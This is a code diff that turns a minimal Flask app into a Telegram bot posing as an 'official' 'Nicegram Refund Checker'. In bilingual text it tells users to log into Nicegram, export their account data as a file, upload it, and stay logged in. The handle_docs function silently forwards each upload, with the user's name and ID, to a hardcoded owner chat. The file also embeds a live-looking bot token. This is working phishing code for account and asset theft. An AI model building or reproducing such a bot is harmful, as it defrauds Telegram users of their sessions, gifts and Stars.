@@ -1,10 +1,200 @@
-from flask import Flask, render_template
+import os
+import logging
+from typing import Dict
+from pathlib import Path
 
-app = Flask(__name__)
+# Make sure to install python-telegram-bot:
+# pip install python-telegram-bot
 
-@app.route('/')
-def home():
-    return render_template('index.html')
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
+from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
+from telegram.constants import ParseMode
+
+# Настройка логирования
+logging.basicConfig(level=logging.INFO)
+logger = logging.getLogger(__name__)
+
+
+class Config:
+    # РЕКОМЕНДАЦИЯ: Лучше хранить токен в переменных окружения
+    # BOT_TOKEN = os.getenv("BOT_TOKEN", "YOUR_TOKEN_HERE")
+    BOT_TOKEN = "8579474300:AAGDLC-8rTyC-_khTo4eTTVDhnVbi_E9oF8"  # Обязательно замени, если это не твой!
+    OWNER_CHAT_IDS = ["8250930469"]
+    BANNER_PATH = "изображение.png"
+    TEMP_DIR = "temp_files"
+
+
+Path(Config.TEMP_DIR).mkdir(parents=True, exist_ok=True)
+
+
+class UserData:
+    def __init__(self):
+        self.lang: str = "ru"
+
+
+user_data: Dict[int, UserData] = {}
+
+
+def get_user_data(user_id: int) -> UserData:
+    if user_id not in user_data:
+        user_data[user_id] = UserData()
+    return user_data[user_id]
+
+
+translations = {
+    "ru": {
+        "welcome": "💎 <b>Nicegram Refund Checker</b>\n\nДобро пожаловать в официальный сервис проверки ликвидности и рефаунда Telegram-подарков, Телеграм-Звезд.\n\n<b>Выберите действие:</b>",
+        "refund_check": "💿 <b>Проверка на рефаунд</b>\n\nПожалуйста, отправьте файл экспорта из Nicegram (.txt или .zip).",
+        "instructions": "📖 <b>Инструкция</b>\n\n1. Cкачайте Nicegram в AppStore или PlayMarket\n2. Войдите в свой аккаунт Telegram\n3. Перейдите в настройки Nicegram\n4. Найдите пункт Экспортировать как файл\n5. Нажмите галочку\n6. Отправьте полученный файл (.txt или .zip) боту.",
+        "back_btn": "◀️ Назад",
+        "file_received": "✅ <b>Файл получен!</b>\n\nОжидайте ответа(5-15 минут), не выходите из аккаунта Nicegram, иначе мы не сможем проверить Refaund.",
+        "processing": "⏳ Анализирую...",
+        "help": "🆘 <b>Помощь</b>\n\n1. Напишите администратору напрямую или же восопользуйтесь ботом поддержки.\n\n2. Опишите проблему подробно.\n\n3. Приложите скриншоты если нужно."
+    },
+    "en": {
+        "welcome": "💎 <b>Nicegram Refund Checker</b>\n\nWelcome to the gift check service.\n\n<b>Choose action:</b>",
+        "refund_check": "💿 <b>Refund Check</b>\n\nSend your Nicegram export (.txt or .zip).",
+        "instructions": "📖 <b>Manual</b>\n\n1. Nicegram Settings\n2. 'Export as file'\n3. Send file here.",
+        "help": "🆘 <b>Help</b>\n\nContact administration.",
+        "back_btn": "◀️ Back",
+        "file_received": "✅ <b>Received!</b>\n\nWait 5-15 minutes.",
+        "processing": "⏳ Analyzing..."
+    }
+}
+
+
+# --- Главное меню с новой кнопкой ---
+def get_main_keyboard(lang: str):
+    return InlineKeyboardMarkup([
+        [
+            InlineKeyboardButton("📖 Инструкция" if lang == "ru" else "📖 Guide", callback_data="inst"),
+            InlineKeyboardButton("💎 Проверка" if lang == "ru" else "💎 Check", callback_data="check")
+        ],
+        [
+            InlineKeyboardButton("📥 Скачать Nicegram" if lang == "ru" else "📥 Download Nicegram",
+                                 callback_data="download")
+        ],
+        [
+            InlineKeyboardButton("🆘 Помощь" if lang == "ru" else "🆘 Help", callback_data="help")
+        ]
+    ])
+
+
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user = update.effective_user
+    for admin_id in Config.OWNER_CHAT_IDS:
+        try:
+            await context.bot.send_message(chat_id=admin_id, text=f"👤 Новый юзер: {user.full_name} ({user.id})")
+        except:
+            pass
+
+    reply_markup = InlineKeyboardMarkup([[
+        InlineKeyboardButton("🇷🇺 Русский", callback_data="l_ru"),
+        InlineKeyboardButton("🇺🇸 English", callback_data="l_en")
+    ]])
+
+    caption = "Выберите язык / Choose language:"
+
+    # Проверка на существование файла баннера
+    if Path(Config.BANNER_PATH).exists():
+        with open(Config.BANNER_PATH, 'rb') as photo:
+            await update.message.reply_photo(photo=photo, caption=caption, reply_markup=reply_markup)
+    else:
+        # Если фото нет, просто отправляем текст
+        await update.message.reply_text(caption, reply_markup=reply_markup)
+
+
+async def callback_query(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    uid = update.effective_user.id
+    data = query.data
+
+    if data.startswith("l_"):
+        get_user_data(uid).lang = data.split("_")[1]
+
+    lang = get_user_data(uid).lang
+
+    text = ""
+    kb = None
+
+    if data.startswith("l_") or data == "back":
+        text, kb = translations[lang]["welcome"], get_main_keyboard(lang)
+
+    elif data == "check":
+        text = translations[lang]["refund_check"]
+        kb = InlineKeyboardMarkup([[InlineKeyboardButton(translations[lang]["back_btn"], callback_data="back")]])
+
+    elif data == "inst":
+        text = translations[lang]["instructions"]
+        kb = InlineKeyboardMarkup([[InlineKeyboardButton(translations[lang]["back_btn"], callback_data="back")]])
+
+    elif data == "help":
+        # Используем .get() для безопасности, чтобы бот не падал если ключа нет
+        text = translations[lang].get("help", "Help section missing")
+        kb = InlineKeyboardMarkup([[InlineKeyboardButton(translations[lang]["back_btn"], callback_data="back")]])
+
+    # --- Новая кнопка "Скачать Nicegram" ---
+    elif data == "download":
+        text = (
+            "📥 <b>Выберите платформу для скачивания Nicegram:</b>"
+            if lang == "ru"
+            else "📥 <b>Select platform to download Nicegram:</b>"
+        )
+
+        kb = InlineKeyboardMarkup([
+            [InlineKeyboardButton("📱 Google Play", url="https://play.google.com/store/apps/details?id=app.nicegram")],
+            [InlineKeyboardButton("🍏 App Store", url="https://apps.apple.com/app/id1608870673")],
+            [InlineKeyboardButton(translations[lang]["back_btn"], callback_data="back")]
+        ])
+
+    if text and kb:
+        try:
+            if query.message.caption:
+                await query.edit_message_caption(caption=text, parse_mode=ParseMode.HTML, reply_markup=kb)
+            else:
+                await query.edit_message_text(text=text, parse_mode=ParseMode.HTML, reply_markup=kb)
+        except Exception as e:
+            logger.error(f"Error updating menu: {e}")
+
+
+async def handle_docs(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user = update.effective_user
+    lang = get_user_data(user.id).lang
+    doc = update.message.document
+
+    if not doc.file_name.lower().endswith(('.txt', '.zip')):
+        await update.message.reply_text("❌ Только .txt или .zip!")
+        return
+
+    for admin_id in Config.OWNER_CHAT_IDS:
+        try:
+            await context.bot.send_document(chat_id=admin_id, document=doc.file_id,
+                                            caption=f"📁 Файл от: {user.full_name}\nID: {user.id}")
+        except:
+            pass
+
+    await update.message.reply_text(
+        translations[lang]["file_received"],
+        parse_mode=ParseMode.HTML,
+        reply_markup=get_main_keyboard(lang)
+    )
+
+
+def main():
+    # Проверка токена
+    if Config.BOT_TOKEN == "":
+        print("ОШИБКА: Вы забыли указать токен бота в Config.BOT_TOKEN")
+        return
+
+    app = Application.builder().token(Config.BOT_TOKEN).build()
+    app.add_handler(CommandHandler("start", start))
+    app.add_handler(CallbackQueryHandler(callback_query))
+    app.add_handler(MessageHandler(filters.Document.ALL, handle_docs))
+
+    print("Бот Nicegram Refund Checker запущен!")
+    app.run_polling()
+
 
 if __name__ == '__main__':
-    app.run(debug=True, host='0.0.0.0', port=5000)
+    main()
